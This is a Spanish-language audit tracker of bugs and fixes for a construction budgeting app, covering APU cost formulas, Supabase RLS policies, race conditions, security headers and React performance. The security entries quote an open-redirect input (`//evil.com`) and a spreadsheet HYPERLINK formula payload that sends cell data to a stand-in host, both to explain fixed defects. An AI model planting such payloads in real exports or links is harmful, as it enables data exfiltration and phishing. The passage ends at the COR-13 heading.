# Bugs y optimizaciones detectados

Última actualización: 2026-05-23.

Este documento es el tracker de bugs, optimizaciones y mejoras detectadas durante la auditoría previa al deploy a GitHub/Vercel/Supabase remoto. Cada entrada incluye estado, severidad, archivo afectado, descripción, propuesta de solución y un espacio para notas de implementación.

El backlog general del MVP vive en [Avances, pendientes y goals](09-avances-y-goals.md); las mejoras post-MVP en [Post-MVP, feature complete y goals](10-post-mvp-goals.md). Este documento es complementario y debe cerrarse antes de habilitar deploy productivo.

Tras la ejecución de los chunks 1-8, los fixes parciales y regresiones detectados en la verificación cruzada quedaron cerrados en el repo. Los checklists remotos `SEG-13` (CAPTCHA en Supabase remoto) y `SEG-26` (Site URL / redirect URLs del dominio Vercel definitivo) también quedaron ejecutados en el entorno remoto. Se preservan 4 entradas marcadas como **no-bug** para mantener el rastro de auditoría.

## Convenciones

- **Estado**: `[ ]` pendiente, `[x]` resuelto, `[~]` parcial o reabierto, `[⊘]` verificado como no-bug, `[?]` decisión de negocio pendiente.
- **Prefijos**: `SEG` seguridad, `COR` correctness/cálculos, `PER` performance, `ARC` arquitectura, `UX` UX/accesibilidad, `TST` testing.
- Cada bug resuelto debe llenar el campo **Notas** con: commit/migración aplicada, verificación realizada y fecha.

## Resumen por estado

| Estado | Cantidad |
| --- | ---: |
| Resueltos verificados | 74 |
| Parciales / reabiertos | 0 |
| Pendientes nuevos de repo | 0 |
| Checklist remoto pre-deploy ejecutado | 2 |
| Checklist remoto pre-deploy pendiente | 0 |
| Verificados como no-bug | 4 |
| **Total entradas** | **80** |

## Resumen por severidad (solo bugs reales del repo)

| Severidad | Resueltos | Parciales / Pendientes |
| --- | ---: | ---: |
| Crítica | 12 | 0 |
| Alta | 19 | 0 |
| Media | 19 | 0 |
| Baja | 24 | 0 |
| **Total bugs del repo** | **74** | **0** |

## Checklist remoto pre-deploy (separado de bugs)

Ítems que no son bugs del repo sino pasos de configuración que se ejecutan al momento del deploy a Supabase remoto + Vercel:

| ID | Descripción breve | Estado |
| --- | --- | --- |
| SEG-13 | Activar CAPTCHA en dashboard de Supabase remoto | [x] Ejecutado remoto |
| SEG-26 | Agregar URL pública de Vercel a `additional_redirect_urls` y `Site URL` | [x] Ejecutado remoto |

Detalle completo en la sección "Checklist Supabase remoto" de `docs/08-produccion.md`.

Actualizar este resumen cada vez que cambie el estado de un ítem.

---

## Críticas

Bloquean el deploy a producción. Deben resolverse antes de subir a GitHub/Vercel/Supabase remoto.

### COR-01: Formula APU anterior aplicaba productividad dentro del parcial

- **Estado**: [x] Resuelto
- **Archivo**: `lib/calculations/apu.ts:54-58`
- **Descripcion**: El modelo APU anterior mezclaba productividad dentro del parcial financiero del recurso. Esto distorsionaba el costo porque la productividad debe convertirse primero en cantidad y luego multiplicarse por el costo unitario.
- **Decisión validada**: el rendimiento no debe multiplicar ni dividir el parcial financiero del APU. El rendimiento puede usarse para planificación, duración, productividad o sugerencias de cronograma, pero no para recalcular el costo parcial si la cantidad ya está expresada como coeficiente unitario.
- **Solucion propuesta**: separar cantidad y parcial financiero, ajustar tests/documentacion y dejar que la productividad se convierta explicitamente antes del calculo monetario.
- **Notas**: Resuelto en workspace el 2026-05-20 y reemplazado por el redisenio APU del 2026-05-26: la productividad ahora usa `rendimiento`, `jornada_horas` y `cuadrilla` segun el tipo de calculo.

### COR-02: Doble cálculo de gastos generales y utilidad

- **Estado**: [x] Resuelto
- **Archivo**: `lib/data/budgets.ts:41-42, 478-483, 1522-1568`
- **Descripción**: En APU se aplica `apuOverheadPercentage = 10%` + `apuProfitPercentage = 10%` al costo directo. Luego `calculateBudgetTotals` aplica `gastos_generales_porcentaje` y `utilidad_porcentaje` del borrador sobre el subtotal que ya tiene esos márgenes. Resultado: doble margen en cada presupuesto.
- **Solución propuesta**: Definir cuál capa aplica los márgenes (APU o presupuesto) y eliminar de la otra. Si APU debe quedar como costo directo, eliminar las constantes `apuOverheadPercentage`/`apuProfitPercentage` y recalcular APUs existentes.
- **Notas**: Resuelto en workspace el 2026-05-20: se eliminaron los márgenes APU hardcodeados en presupuestos; las líneas usan costo directo y los márgenes se aplican solo en totales de presupuesto. Verificado con `pnpm run supabase:types`, `pnpm test`, `pnpm exec tsc --noEmit`, `pnpm lint` y `pnpm build`.

### COR-03: `emitOfficialBudgetVersion` mapea líneas por `orden` (no único en `find`)

- **Estado**: [⊘] No es bug (verificado contra el código)
- **Archivo**: `lib/data/budgets.ts:1416-1421`
- **Descripción original**: `lineIdMap` se construye con `insertedLines.find((insertedLine) => insertedLine.orden === line.orden)`. Se sospechaba que dos partidas con el mismo `orden` enlazarían recursos a la línea equivocada.
- **Verificación**: existe el índice `presupuesto_borrador_partidas_orden_idx UNIQUE (presupuesto_borrador_id, orden)` en la migración `20260515000000_collaborative_model.sql:409`. Órdenes duplicados fallan en INSERT antes de llegar al `.find`. La versión también tiene `presupuesto_version_partidas_orden_idx UNIQUE`. El mapeo por orden es correcto bajo esas constraints.
- **Nota de calidad**: el código sigue siendo frágil; mapear por `line.id` sería más robusto, pero no es un bug funcional. Se puede tratar como refactor opcional en post-MVP.
- **Notas**: _(vacío)_

### COR-04: `selectDraftResourceClientQuote` no recalcula totales

- **Estado**: [⊘] No es bug (verificado contra el código)
- **Archivo**: `lib/data/budgets.ts:1153-1225`
- **Descripción original**: Se sospechaba que la función debía llamar a `recalculateDraftTotals` al cambiar el precio cliente.
- **Verificación**: los totales internos del presupuesto (`subtotal`, `gastos_generales_total`, `utilidad_total`, `igv_total`, `total`) se calculan a partir de `precio_unitario_actual` de cada línea, que viene del APU usando `costo_unitario_actual` (costo interno). El precio cliente (`precio_cliente_actual`) solo afecta la exportación cliente, no los totales internos. Por diseño, cambiar el precio cliente no debe recalcular totales internos.
- **Nota de calidad**: sí sería recomendable validar `assertNonNegative` en la suma de `costo_unitario + costo_transporte` antes de persistir, y validar que el proveedor esté `estado: "activo"` (no solo `disponible_para_cliente`). Eso se cubre en COR-08.
- **Notas**: _(vacío)_

### SEG-01: Open redirect en parámetro `next` del login

- **Estado**: [x] Resuelto
- **Archivo**: `app/login/page.tsx:37`
- **Descripción**: `router.replace(searchParams.get("next") ?? "/")` no valida que sea ruta interna. `/login?next=//evil.com` redirige al sitio externo tras autenticación.
- **Solución propuesta**: Validar `next.startsWith("/") && !next.startsWith("//")` antes de redirigir. Rechazar URLs absolutas y protocol-relative.
- **Notas**: Resuelto en workspace el 2026-05-20: `sanitizeNextPath` solo permite rutas internas y el login usa fallback `/` para URLs absolutas, protocol-relative o inválidas. Verificado con `pnpm run supabase:types`, pgTAP, `pnpm test`, `pnpm exec tsc --noEmit`, `pnpm lint` y `pnpm build`.

### SEG-02: CSV/Formula injection en exportaciones Excel

- **Estado**: [x] Resuelto
- **Archivo**: `lib/exports/budget.ts:134-186`
- **Descripción**: Campos `nombre_snapshot`, `cliente`, `ubicacion`, `codigo_snapshot` se insertan crudos en celdas. Un usuario que escribe `=HYPERLINK("evil.com/?x="&A1)` como nombre de partida exfiltra datos cuando otro abre el `.xlsx`.
- **Solución propuesta**: Prefijar con `'` toda celda string que empiece con `=`, `+`, `-`, `@`, `\t`, `\r` antes de pasarla a `aoa_to_sheet`. Aplicar a budget interno y a cliente.
- **Notas**: Resuelto en workspace el 2026-05-20: `sanitizeExcelCell` prefija strings que empiezan con `=`, `+`, `-`, `@`, tab o carriage return antes de escribir Excel interno o cliente. Verificado con `pnpm run supabase:types`, pgTAP, `pnpm test`, `pnpm exec tsc --noEmit`, `pnpm lint` y `pnpm build`.

### SEG-03: Project admin puede mover proyecto a otra organización

- **Estado**: [x] Resuelto
- **Archivo**: `supabase/migrations/20260518000000_auth_rls_ownership.sql:343-346`
- **Descripción**: La policy `proyectos_update_project_admins` permite UPDATE de cualquier columna incluyendo `organizacion_id`. Un project-admin (no org-admin) puede cambiar el `organizacion_id` y heredar el proyecto y sus snapshots en otra organización.
- **Solución propuesta**: Crear trigger `before update` que rechace cambios a `organizacion_id`, o ajustar `with check` para forzar igualdad con el valor previo. Nueva migración necesaria.
- **Notas**: Resuelto en workspace el 2026-05-20: migración `20260520150000_budget_integrity_transactions.sql` agrega trigger `prevent_project_organization_change()` y pgTAP valida que un admin no pueda cambiar `organizacion_id`. Verificado con `pnpm run supabase:types`, `pnpm exec supabase test db supabase/tests/rls.sql`, `pnpm test`, `pnpm exec tsc --noEmit`, `pnpm lint` y `pnpm build`.

### SEG-04: Mass assignment en `updateBudgetDraft`

- **Estado**: [x] Resuelto
- **Archivo**: `lib/data/budgets.ts:644-649`
- **Descripción**: El tipo TS restringe en compilación, no en runtime. Un cliente malicioso desde DevTools puede pasar `subtotal`, `total`, `igv_porcentaje: 0`, `proyecto_id` y la UPDATE prospera bajo su propia organización. Falsifica el borrador y la versión emitida hereda lo manipulado.
- **Solución propuesta**: Usar `z.object({...}).strict()` con whitelist explícita de campos antes del UPDATE. Aplicar el mismo patrón a otros repositorios que hagan spread directo del input.
- **Notas**: Resuelto en workspace el 2026-05-20: `updateBudgetDraft` usa `budgetDraftUpdateSchema.strict()` sobre payload filtrado y envía una allowlist explícita de campos editables. Test unitario valida que keys extra no lleguen al UPDATE. Verificado con `pnpm run supabase:types`, `pnpm exec supabase test db supabase/tests/rls.sql`, `pnpm test`, `pnpm exec tsc --noEmit`, `pnpm lint` y `pnpm build`.

### SEG-05: Sin headers de seguridad en producción

- **Estado**: [x] Resuelto
- **Archivo**: `next.config.mjs:1-4`
- **Descripción**: Config vacía. Faltan CSP, HSTS, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy. App clickjackeable y vulnerable a inyección de scripts.
- **Solución propuesta**: Agregar `async headers()` con cabeceras mínimas: CSP estricta (no se usa `dangerouslySetInnerHTML`), HSTS, `X-Frame-Options: DENY`, `Referrer-Policy: strict-origin-when-cross-origin`, `X-Content-Type-Options: nosniff`.
- **Notas**: Resuelto en workspace el 2026-05-20: `next.config.mjs` agrega CSP, `X-Frame-Options`, `X-Content-Type-Options`, `Referrer-Policy: same-origin`, `Permissions-Policy` y HSTS solo en producción. Verificado con `pnpm run supabase:types`, pgTAP, `pnpm test`, `pnpm exec tsc --noEmit`, `pnpm lint` y `pnpm build`.

### SEG-06: Regex roto en INSERT policy de realtime para project topics

- **Estado**: [x] Resuelto
- **Archivo**: `supabase/migrations/20260520123000_realtime_presence_authorization.sql:30-34`
- **Descripción**: El regex de la policy INSERT para `project:*` le falta un grupo UUID. Solo tiene 8-4-4-12 en vez de 8-4-4-4-12. Resultado: nadie puede insertar mensajes de Presence/Broadcast a canales de proyecto en remoto. La colaboración por proyecto está rota.
- **Solución propuesta**: Nueva migración que reemplace la policy con el regex correcto: `^project:[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$`.
- **Notas**: Resuelto en workspace el 2026-05-20: la migración `20260520171946_chunk4_realtime_presence_collaboration.sql` reemplaza la INSERT policy de `realtime.messages` con regex UUID completo para `project:*`; pgTAP valida publicación Presence en proyecto válido y rechazo de topic malformado. Verificado con `pnpm run supabase:types`, pgTAP, tests realtime, `pnpm exec tsc --noEmit`, `pnpm lint` y `pnpm build`.

### ARC-01: `emitOfficialBudgetVersion` no es transaccional

- **Estado**: [x] Resuelto
- **Archivo**: `lib/data/budgets.ts:1353-1467`
- **Descripción**: La emisión hace INSERT del header, luego loop de INSERTs de líneas, luego INSERT batch de recursos. Si falla en la línea 5 de 20, queda una versión "emitida" parcial sin rollback. Compromete la integridad del activo más importante del sistema.
- **Solución propuesta**: Convertir a RPC SQL única (`emit_official_budget_version`) que envuelva todo en una transacción. La RPC también puede resolver `numero_version` server-side con `MAX(...) + 1` atómico para eliminar la race condition.
- **Notas**: Resuelto en workspace el 2026-05-20: `emit_official_budget_version` bloquea el borrador con `FOR UPDATE`, valida permisos/estado/`updated_at`, inserta versión, líneas, recursos y auditoría en una sola RPC y el repositorio adapta el JSON al contrato actual. Verificado con `pnpm run supabase:types`, `pnpm exec supabase test db supabase/tests/rls.sql`, `pnpm test`, `pnpm exec tsc --noEmit`, `pnpm lint` y `pnpm build`.

### ARC-02: Cascada de N+M queries en `updateResource` y `updateResourceQuote`

- **Estado**: [x] Resuelto
- **Archivo**: `lib/data/resources.ts:235-241`, `lib/data/quotes.ts:163-167`, `lib/data/budgets.ts:757-880`
- **Descripción**: Actualizar UN recurso o cotización dispara `refreshDraftCurrentPricesForResources`, que itera todos los borradores afectados y para cada uno corre `refreshDraftCurrentPrices`, que hace un UPDATE por recurso, luego recalcula líneas (fetch + UPDATEs) y luego totales (fetch + UPDATE). Con 5 borradores × 40 recursos ≈ 270 queries por una sola edición.
- **Solución propuesta**: Convertir `refreshDraftCurrentPrices` a una RPC SQL con un solo UPDATE batch usando `unnest` o `jsonb_to_recordset`. Alternativa: hacer el refresh asíncrono vía pg_cron / job en background.
- **Notas**: Resuelto en workspace el 2026-05-21: se agregaron RPCs set-based `refresh_draft_current_prices` y `refresh_draft_current_prices_for_resources`; `updateResource`/`updateResourceQuote` delegan el refresco a SQL sin loops TypeScript por borrador/recurso. Cubierto por pgTAP y tests de repositorio.

### ARC-03: `createBrowserClient()` no es singleton

- **Estado**: [x] Resuelto
- **Archivo**: `lib/supabase/browser.ts:6-10`
- **Descripción**: `@supabase/ssr` no auto-singletoniza. Cada llamada parsea URL, construye storage adapter, configura auth listeners. En `presupuestos/page.tsx` se invoca ~20 veces, en la app cientos por sesión.
- **Solución propuesta**: Cachear el cliente al primer uso:
  ```ts
  let cached: SupabaseClient<Database> | null = null;
  export function createBrowserClient() {
    if (!cached) cached = createSupabaseBrowserClient(...);
    return cached;
  }
  ```
- **Notas**: Resuelto en workspace el 2026-05-21: `createBrowserClient()` cachea una instancia module-level y `Topbar` reutiliza ese singleton. Cubierto por `lib/supabase/browser.test.ts`.

### PER-01: Refetch redundante por propias mutaciones en Realtime

- **Estado**: [x] Resuelto
- **Archivo**: `lib/realtime/useActivitySubscription.ts:80-109`
- **Descripción**: La config `broadcast: { self: false }` solo aplica a mensajes enviados por el cliente. Los broadcasts se generan por un trigger de Postgres, por lo que el cliente recibe sus propios eventos. Cada mutación dispara un `loadData()` completo 600ms después.
- **Solución propuesta**: Gatear el refetch sobre `shouldShowActivityToast(payload, currentActorId)` para que las propias mutaciones no disparen reload. Reemplazar:
  ```ts
  if (shouldShowActivityToast(payload, currentActorId)) {
    // toast + refetch
    refetchTimer = setTimeout(...);
  }
  ```
- **Notas**: Resuelto en workspace el 2026-05-20: `useActivitySubscription` procesa toast/refetch solo para eventos externos, evitando reloads por broadcasts generados por las propias mutaciones. Cubierto por tests de `shouldRefetchForActivity`. Verificado con tests realtime, `pnpm exec tsc --noEmit`, `pnpm lint` y `pnpm build`.

---

## Altas

Resolver antes de uso con datos reales o múltiples usuarios concurrentes.

### COR-05: APU no respeta `precio_fijado` del recurso al recalcular línea

- **Estado**: [⊘] No es bug (verificado contra el código)
- **Archivo**: `lib/data/budgets.ts:1511-1543`
- **Descripción original**: Se sospechaba que el recálculo de línea sobreescribía recursos con `precio_fijado`.
- **Verificación**: `shouldAutoUpdateDraftResourcePrice` (línea 96-106) retorna `false` cuando `resource.precio_fijado === true`, por lo que el loop de `refreshDraftCurrentPrices` no actualiza el `costo_unitario_actual` de esos recursos. Cuando luego `recalculateDraftLinePrices` suma los `costo_unitario_actual`, los recursos fijados conservan el valor preservado. La lógica es correcta.
- **Notas**: _(vacío)_

### COR-06: Floating point sin redondeo en montos de dinero

- **Estado**: [x] Resuelto
- **Archivo**: `lib/calculations/apu.ts`, `lib/calculations/budget.ts`
- **Descripción**: Ninguna función redondea a 2 decimales. Persistir `0.30000000000000004` en `parcial`/`total` causa drift entre líneas y totales mostrados.
- **Solución propuesta**: Aplicar `Math.round(x * 100) / 100` al final de cada función pública de cálculo. Considerar usar una librería de decimal fixed-point si la precisión sigue siendo problema (`decimal.js`, `big.js`).
- **Notas**: Resuelto en workspace el 2026-05-20: se agregó `roundMoney` y las salidas públicas de APU, presupuesto y exportación cliente redondean a 2 decimales. Verificado con `pnpm run supabase:types`, `pnpm test`, `pnpm exec tsc --noEmit`, `pnpm lint` y `pnpm build`.

### COR-07: `selectInternalQuote` no filtra por vigencia

- **Estado**: [x] Resuelto
- **Archivo**: `lib/calculations/client-prices.ts:26-34`
- **Descripción**: Solo filtra por `estado === "activo"`. Una cotización con `vigente_hasta` pasado pero `estado=activo` se elige como precio interno.
- **Solución propuesta**: Agregar filtro por vigencia: `(!quote.vigente_hasta || new Date(quote.vigente_hasta) >= new Date()) && (!quote.vigente_desde || new Date(quote.vigente_desde) <= new Date())`.
- **Notas**: Resuelto en workspace el 2026-05-20: `selectInternalQuote` y el filtro compartido de cotizaciones activas respetan `vigente_desde`/`vigente_hasta`. Verificado con `pnpm run supabase:types`, `pnpm test`, `pnpm exec tsc --noEmit`, `pnpm lint` y `pnpm build`.

### COR-08: `resolveClientPriceForResource` no excluye proveedores inactivos

- **Estado**: [x] Resuelto
- **Archivo**: `lib/calculations/client-prices.ts:43-63`
- **Descripción**: El fallback general acepta cotizaciones cuyo proveedor está desactivado.
- **Solución propuesta**: Filtrar también `quote.proveedor?.estado !== "inactivo"` en `activeQuotes`.
- **Notas**: Resuelto en workspace el 2026-05-20: el fallback general excluye cotizaciones de proveedores inactivos desde el filtro compartido de cotizaciones activas. Verificado con `pnpm run supabase:types`, `pnpm test`, `pnpm exec tsc --noEmit`, `pnpm lint` y `pnpm build`.

### COR-09: `calculateSchedule` agrupa paralelos por profundidad, no por solapamiento

- **Estado**: [x] Resuelto
- **Archivo**: `lib/calculations/schedule.ts:95-98`
- **Descripción**: `parallelGroup` se calcula como `max(deps.parallelGroup + 1)`. Es ordinal por profundidad, no por concurrencia real. Dos tareas independientes con distinta profundidad nunca se agrupan aunque corran simultáneamente.
- **Solución propuesta**: Agrupar por solapamiento de intervalos `[earlyStart, earlyFinish]` en vez de profundidad de dependencias.
- **Notas**: Resuelto en workspace el 2026-05-20: `parallelGroups` se asigna por solapamiento real de intervalos tempranos. Verificado con `pnpm run supabase:types`, `pnpm test`, `pnpm exec tsc --noEmit`, `pnpm lint` y `pnpm build`.

### COR-10: `manualStartDate < projectStartDate` se ignora silenciosamente

- **Estado**: [x] Resuelto
- **Archivo**: `lib/calculations/schedule.ts:90-93`
- **Descripción**: `Math.max(0, ..., manualStartOffset)` ignora offsets negativos. El usuario no recibe feedback de que su fecha manual está antes del proyecto.
- **Solución propuesta**: Devolver warning explícito si `manualStartOffset < 0` o validar en el form antes de aceptar.
- **Notas**: Resuelto en workspace el 2026-05-20: `calculateSchedule` lanza `RangeError` cuando la fecha manual es anterior al inicio del proyecto. Verificado con `pnpm run supabase:types`, `pnpm test`, `pnpm exec tsc --noEmit`, `pnpm lint` y `pnpm build`.

### COR-11: `rendimiento` permite 0 en validación

- **Estado**: [x] Resuelto
- **Archivo**: `lib/validations/items.ts:20`
- **Descripcion**: `coercedNonNegativeNumber.optional().nullable()` aceptaba 0. Un rendimiento 0 podia generar cantidades o parciales invalidos silenciosamente.
- **Solución propuesta**: Usar `.positive()` o transformar 0 → null en el preprocess de Zod.
- **Notas**: Resuelto en workspace el 2026-05-20 y actualizado el 2026-05-26: rendimiento vacio usa default `1`; rendimiento `0` o negativo se rechaza.

### COR-12: Validaciones Zod sin `.max()` en strings

- **Estado**: [x] Resuelto
- **Archivo**: `lib/validations/shared.ts:17-19` (y todos los validators que usan `requiredString`)
- **Descripción**: `requiredString` no tiene límite. Un nombre de 5MB pasa validación y revienta o trunca en Postgres.
- **Solución propuesta**: Agregar `.max(255)` (o el largo correspondiente a cada columna) en `requiredString` y revisar todos los campos para confirmar límites razonables.
- **Notas**: Resuelto en workspace el 2026-05-20: `requiredString` agrega `.max(255)` por defecto y conserva parámetro para límites específicos futuros. Verificado con `pnpm run supabase:types`, `pnpm test`, `pnpm exec tsc --noEmit`, `pnpm lint` y `pnpm build`.

### ARC-04: Race condition en `orden` de `addDraftPartida`

- **Estado**: [x] Resuelto
- **Archivo**: `lib/data/budgets.ts:501`
- **Descripción**: Constraint UNIQUE en `(presupuesto_borrador_id, orden)`. Si dos usuarios agregan una partida simultáneamente, ambos calculan `orden = N+1` → constraint violation.
- **Solución propuesta**: Resolver `orden` server-side dentro de una RPC SQL: `coalesce(max(orden), 0) + 1`. O usar un trigger `before insert` que setee orden.
- **Notas**: Resuelto en workspace el 2026-05-20: `add_draft_partida` calcula `orden = max(orden)+1` dentro de la transacción tras bloquear el borrador; pgTAP valida órdenes distintos al agregar partidas por RPC. Verificado con `pnpm run supabase:types`, `pnpm exec supabase test db supabase/tests/rls.sql`, `pnpm test`, `pnpm exec tsc --noEmit`, `pnpm lint` y `pnpm build`.

### ARC-05: Race condition en `numero_version` al emitir versión oficial

- **Estado**: [x] Resuelto
- **Archivo**: `lib/data/budgets.ts:1350`
- **Descripción**: `nextVersionNumber = Math.max(0, ...versions.map(v => v.numero_version)) + 1`. Dos usuarios emitiendo simultáneamente computan el mismo número → constraint violation `presupuesto_versiones_unique_numero`.
- **Solución propuesta**: Resolver dentro de la RPC transaccional (ver ARC-01) usando `MAX(numero_version) + 1` con FOR UPDATE o secuencia.
- **Notas**: Resuelto en workspace el 2026-05-20: `emit_official_budget_version` calcula `numero_version` server-side dentro de la transacción bloqueada y se mantiene el índice único `(proyecto_id, numero_version)`. pgTAP valida emisiones secuenciales sin duplicados. Verificado con `pnpm run supabase:types`, `pnpm exec supabase test db supabase/tests/rls.sql`, `pnpm test`, `pnpm exec tsc --noEmit`, `pnpm lint` y `pnpm build`.

### ARC-06: TOCTOU en emisión de versión oficial

- **Estado**: [x] Resuelto
- **Archivo**: `lib/data/budgets.ts:1322-1348`
- **Descripción**: Se lee el borrador, se compara `updated_at` en cliente, se inserta la versión. Entre la lectura y el insert, otro usuario puede modificar el borrador. La versión emitida no reflejaría el último estado.
- **Solución propuesta**: Dentro de la RPC transaccional (ARC-01), usar `SELECT ... FOR UPDATE` del borrador y verificar `updated_at` server-side antes de insertar.
- **Notas**: Resuelto en workspace el 2026-05-20: la RPC verifica `p_expected_updated_at` contra el borrador bloqueado antes de insertar snapshots; pgTAP valida stale sin versión parcial. Verificado con `pnpm run supabase:types`, `pnpm exec supabase test db supabase/tests/rls.sql`, `pnpm test`, `pnpm exec tsc --noEmit`, `pnpm lint` y `pnpm build`.

### ARC-07: Cascada N+1 en `refreshDraftCurrentPrices` interno

- **Estado**: [x] Resuelto
- **Archivo**: `lib/data/budgets.ts:808-858`
- **Descripción**: Loop con UPDATE individual por cada recurso del borrador. 40 recursos = 40 queries secuenciales.
- **Solución propuesta**: Reemplazar con un único UPDATE usando `unnest`/`jsonb_to_recordset` o una RPC SQL. Forma parte de ARC-02.
- **Notas**: Resuelto en workspace el 2026-05-21: el refresco de precios del borrador actualiza recursos, líneas y totales en SQL mediante `refresh_draft_current_prices`, respetando precios fijados, overrides cliente, vigencia de cotizaciones y proveedor activo. Cubierto por pgTAP.

### ARC-08: Loop de INSERTs en `emitOfficialBudgetVersion`

- **Estado**: [x] Resuelto
- **Archivo**: `lib/data/budgets.ts:1385-1413`
- **Descripción**: Inserts uno-a-uno de líneas de versión en un for loop. 20 partidas = 20 inserts secuenciales.
- **Solución propuesta**: Cambiar a un único `insert(arrayOfLines).select()`. Se resuelve junto a ARC-01.
- **Notas**: Resuelto en workspace el 2026-05-20: la emisión oficial usa `INSERT ... SELECT` con CTEs para líneas y recursos, eliminando el loop TypeScript y congelando snapshots de forma set-based. Verificado con `pnpm run supabase:types`, `pnpm exec supabase test db supabase/tests/rls.sql`, `pnpm test`, `pnpm exec tsc --noEmit`, `pnpm lint` y `pnpm build`.

### SEG-07: Credenciales prellenadas en login

- **Estado**: [x] Resuelto
- **Archivo**: `app/login/page.tsx:14-15`
- **Descripción**: `useState("owner@cyp.local")`, `useState("Password123!")` hardcoded. Si las migraciones del seed se aplican accidentalmente a producción, basta tocar "Entrar" para tomar la cuenta.
- **Solución propuesta**: Solo prefijar valores cuando `process.env.NODE_ENV !== "production"`.
- **Notas**: Resuelto en workspace el 2026-05-20: las credenciales demo solo se prellenan cuando `NODE_ENV !== "production"`. Verificado con `pnpm run supabase:types`, pgTAP, `pnpm test`, `pnpm exec tsc --noEmit`, `pnpm lint` y `pnpm build`.

### SEG-08: `updateUser({password})` sin validar contraseña actual

- **Estado**: [x] Resuelto
- **Archivo**: `app/actualizar-clave/page.tsx:27`
- **Descripción**: Un atacante con sesión robada (cookie/XSS) puede cambiar la contraseña sin saber la actual → account takeover persistente.
- **Solución propuesta**: Activar "Reauthentication for password change" en Supabase Auth (`secure_password_change = true` en config.toml para staging/producción).
- **Notas**: Resuelto en workspace el 2026-05-20: `supabase/config.toml` activa `secure_password_change = true` y la UI usa validación fuerte compartida antes de actualizar contraseña. Verificado con `pnpm run supabase:types`, pgTAP, `pnpm test`, `pnpm exec tsc --noEmit`, `pnpm lint` y `pnpm build`.

### SEG-09: Middleware sin timeout ni error handling

- **Estado**: [x] Resuelto
- **Archivo**: `middleware.ts:65-78`
- **Descripción**: Cada request autenticado dispara queries a Supabase sin protección. Si Supabase queda lento, el middleware se bloquea hasta timeout edge (504). Errores se interpretan como "sin membresía" → redirect incorrecto a `/onboarding`.
- **Solución propuesta**: Envolver en try/catch con `AbortController` (timeout 2s). En caso de error, devolver `response` por defecto en vez de redirigir.
- **Notas**: Resuelto en workspace el 2026-05-20: middleware envuelve `auth.getUser()` y consulta de membresía con timeout/catch; ante error devuelve la respuesta normal y evita redirecciones falsas a onboarding. Verificado con `pnpm run supabase:types`, pgTAP, `pnpm test`, `pnpm exec tsc --noEmit`, `pnpm lint` y `pnpm build`.

### PER-02: Handlers inline en filas de tablas grandes

- **Estado**: [x] Resuelto
- **Archivo**: `components/presupuestos/BudgetTable.tsx:131-189`, `components/proveedores/ProviderTable.tsx`, `components/recursos/ResourceTable.tsx`, `components/partidas/PartidaTable.tsx`
- **Descripción**: `onClick`/`onChange` se crean inline por fila. Cada keystroke en input de metrado dispara render de todas las filas.
- **Solución propuesta**: Extraer `<BudgetRow />` con `React.memo` y estabilizar callbacks padres con `useCallback`. Repetir patrón en las demás tablas.
- **Notas**: Resuelto en workspace el 2026-05-21: se extrajeron/memoizaron filas y callbacks en tablas de presupuesto, proveedores, recursos y partidas para reducir renders por edición. Chunk 8 completó la parte faltante en `BudgetTable.tsx` con `<BudgetRow />` memoizado y handlers estabilizados. Verificado con `pnpm test`, `pnpm exec tsc --noEmit`, `pnpm lint` y `pnpm build`.

### PER-03: Cronograma con select O(N²) por render

- **Estado**: [x] Resuelto
- **Archivo**: `app/cronogramas/page.tsx:344-361`
- **Descripción**: Cada fila renderiza `<option>` con `tasks.filter(...)`. 50 partidas = 50×49 nodos creados en cada keystroke de duración.
- **Solución propuesta**: Memoizar la lista de opciones fuera del map; extraer `<ScheduleRow />` memo.
- **Notas**: Resuelto en workspace el 2026-05-21: `/cronogramas` memoiza opciones/mapas/conteos y usa fila memoizada para evitar recomputar filtros por cada tarea.

### PER-04: `taskResultById`, `criticalCount` y memos faltantes en presupuestos

- **Estado**: [x] Resuelto
- **Archivo**: `app/cronogramas/page.tsx:95-99`, `app/presupuestos/page.tsx:259-325`
- **Descripción**: `new Map(...)`, `.filter(...)`, `new Set(...flatMap)` se recalculan en cada render aunque `schedule` no cambie. En presupuestos: `selectedLine`, `selectedLineResources`, `presenceTarget`, `kpis`, `warningResources` no están memoizados.
- **Solución propuesta**: Envolver en `useMemo` con sus dependencias correctas. Repasar también `draftLineById` en `BudgetTable` y `providerMap` en `ResourceTable`.
- **Notas**: Resuelto en workspace el 2026-05-21: se memoizaron mapas/conteos de cronogramas y, en presupuestos, `draftLineById`, línea seleccionada, recursos seleccionados, alertas cliente, KPIs y `presenceTarget`.

### SEG-26: `additional_redirect_urls` sin URL de producción

- **Estado**: [x] Checklist remoto ejecutado — no era un bug del repo.
- **Archivo**: `supabase/config.toml:158` (referencia local) + dashboard remoto de Supabase.
- **Descripción**: `additional_redirect_urls = ["https://127.0.0.1:3000"]` solo contiene localhost. Cuando se promueva a Supabase remoto, los flujos `resetPasswordForEmail`/`signUp` con `emailRedirectTo` apuntando al dominio real serán rechazados por Supabase Auth si no se agregan a la whitelist.
- **Solución propuesta**: al obtener la URL pública (dominio Vercel), agregarla a `additional_redirect_urls` y al `Site URL` en el dashboard remoto de Supabase. Documentar el paso en `docs/08-produccion.md` como checklist pre-deploy. No corresponde codificar una URL placeholder hoy.
- **Notas**: Ejecutado en Supabase remoto el 2026-05-22: Site URL y Additional Redirect URLs quedaron apuntando a `https://cyp-sistema-costos-presupuestos.vercel.app` y `/auth/callback`.

### UX-01: Modals sin focus trap, ESC ni `role="dialog"`

- **Estado**: [x] Resuelto
- **Archivo**: `components/shared/ConflictResolutionDialog.tsx:30`, `components/shared/ConfirmDialog.tsx:40`
- **Descripción**: Son `<div>` con backdrop, sin tecla Escape, sin atrapar foco, sin `aria-labelledby`. Usuarios con teclado quedan navegando atrás del modal.
- **Solución propuesta**: Agregar `role="dialog" aria-modal="true" aria-labelledby=...`, listener Escape global, focus inicial al botón primario. Considerar librería headless (`@radix-ui/react-dialog`).
- **Notas**: Resuelto en workspace el 2026-05-21: `ConfirmDialog` y `ConflictResolutionDialog` tienen `role="dialog"`, `aria-modal`, `aria-labelledby`, descripcion, foco inicial, cierre con Escape, trap de Tab/Shift+Tab y restauracion de foco.

---

## Medias

Resolver cuando se pueda. Afectan calidad pero no bloquean producción.

### COR-13: `motivo_precio_fijado` no snapshoteado en versión oficial

- **Estado**: [x] Resuelto
- **Archivo**: `lib/data/budgets.ts:1399-1404`
